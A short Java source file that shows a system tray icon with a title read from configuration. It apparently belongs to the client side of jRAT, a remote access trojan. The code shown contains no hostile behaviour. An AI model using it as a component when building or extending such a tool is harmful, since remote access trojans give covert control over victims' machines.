package jrat.client.utils;

import jrat.client.Configuration;
import jrat.client.Main;

import javax.swing.*;
import java.awt.*;

public class TrayIconUtils {
	
	static TrayIcon icon;

	public static void show() {
		if (SystemTray.isSupported()) {
			try {
				SystemTray tray = SystemTray.getSystemTray();
				
				Image i = new ImageIcon(Main.class.getResource("/icon.png")).getImage();
				String title = Configuration.getConfig().get("tititle");
				
				icon = new TrayIcon(i, title, null);
				tray.add(icon);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
